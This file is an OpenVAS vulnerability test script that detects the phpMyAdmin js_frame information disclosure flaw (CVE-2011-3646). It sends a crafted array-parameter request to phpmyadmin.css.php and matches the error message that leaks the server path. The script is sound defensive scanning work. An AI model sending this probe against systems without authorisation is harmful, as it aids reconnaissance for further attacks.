###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpmyadmin_js_frame_info_disc_vuln.nasl 7019 2017-08-29 11:51:27Z teissa $
#
# phpMyAdmin js_frame Parameter Information Disclosure Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks.
  Impact Level: Application";
tag_affected = "phpMyAdmin version 3.4.5 and prior";
tag_insight = "The flaw is due to insufficient input validation in 'js_frame'
  parameter in 'phpmyadmin.css.php', which allows attackers to disclose
  information that could be used in further attacks.";
tag_solution = "Upgrade to phpMyAdmin 3.4.6 or Apply the patch from below link,
  http://www.phpmyadmin.net/home_page/downloads.php
  http://phpmyadmin.git.sourceforge.net/git/gitweb.cgi?p=phpmyadmin/phpmyadmin;a=commitdiff;h=d35cba980893aa6e6455fd6e6f14f3e3f1204c52";
tag_summary = "The host is running phpMyAdmin and is prone to information
  disclosure vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.801994";
CPE = "cpe:/a:phpmyadmin:phpmyadmin";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7019 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-29 13:51:27 +0200 (Tue, 29 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-10-18 15:48:35 +0200 (Tue, 18 Oct 2011)");
  script_cve_id("CVE-2011-3646");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("phpMyAdmin js_frame Parameter Information Disclosure Vulnerability");
  script_xref(name : "URL" , value : "http://www.auscert.org.au/render.html?it=14975");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Oct/690");
  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=746882");
  script_xref(name : "URL" , value : "http://www.phpmyadmin.net/home_page/security/PMASA-2011-15.php");

  script_tag(name:"qod_type", value:"remote_active");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_phpmyadmin_detect_900129.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("phpMyAdmin/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get phpMyAdmin Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Get the Directory from KB
if(dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))
{
  ## Construct attack request
  url = dir + "/phpmyadmin.css.php?js_frame[]=right";

  ## Try Attack and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, check_header: TRUE,
     pattern:"Cannot modify header information.*/phpmyadmin.css.php")) {
    security_message(port);
  }
}
